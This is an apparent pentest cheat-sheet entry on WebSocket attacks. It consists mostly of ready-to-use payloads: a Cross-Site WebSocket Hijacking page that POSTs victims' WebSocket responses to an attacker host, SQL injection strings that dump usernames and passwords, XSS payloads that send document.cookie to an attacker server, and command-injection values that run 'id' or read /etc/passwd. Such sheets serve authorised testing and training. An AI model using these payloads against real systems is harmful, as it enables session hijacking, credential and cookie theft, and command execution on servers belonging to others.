---
description: |
  WebSocket attacks — intercept, manipulate, and inject payloads through WebSocket connections for cross-site hijacking, SQLi, XSS, and command injection.
command: |
  # Intercept WebSocket in Burp Suite
  # 1. Configure Burp proxy as usual
  # 2. Navigate to target application using WebSockets
  # 3. Go to Proxy → WebSockets history tab to view WS messages
  # 4. Right-click messages to send to Repeater for manipulation
  # 5. Modify message content and resend

  # websocat — CLI WebSocket interaction
  # Connect to WebSocket endpoint
  websocat ws://10.10.10.27/ws

  # Connect with custom headers
  websocat -H "Cookie: session=SESSIONID" ws://10.10.10.27/ws

  # Connect to secure WebSocket
  websocat wss://10.10.10.27/ws

  # Pipe commands
  echo '{"action":"getUsers"}' | websocat ws://10.10.10.27/ws

  # Cross-Site WebSocket Hijacking (CSWSH)
  <!-- Host on attacker server — exploits missing Origin validation -->
  <html>
  <script>
  var ws = new WebSocket('ws://10.10.10.27/ws');
  ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
  };
  ws.onmessage = function(event) {
    // Exfiltrate WebSocket responses to attacker
    fetch('http://10.10.10.21:8000/exfil', {
      method: 'POST',
      body: event.data
    });
  };
  </script>
  </html>

  # SQL injection via WebSocket messages
  # Normal message
  {"action":"search","query":"test"}

  # SQLi payload
  {"action":"search","query":"test' OR 1=1-- -"}
  {"action":"search","query":"test' UNION SELECT username,password FROM users-- -"}

  # XSS via WebSocket messages
  # If WebSocket messages are rendered in the DOM
  {"message":"<script>document.location='http://10.10.10.21:8000/steal?c='+document.cookie</script>"}
  {"message":"<img src=x onerror=fetch('http://10.10.10.21:8000/'+document.cookie)>"}

  # Command injection through WebSocket
  {"action":"ping","host":"127.0.0.1; id"}
  {"action":"ping","host":"127.0.0.1 | cat /etc/passwd"}
  {"action":"exec","cmd":"whoami"}

  # Test Origin header validation
  # Check if server validates Origin header on WebSocket upgrade
  curl -i -N \
    -H "Connection: Upgrade" \
    -H "Upgrade: websocket" \
    -H "Sec-WebSocket-Version: 13" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Origin: https://evil.com" \
    http://10.10.10.27/ws

  # If 101 Switching Protocols is returned, Origin is not validated
items:
  - No_Creds
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - WebSocket_Attack
references:
  - https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html
  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
---
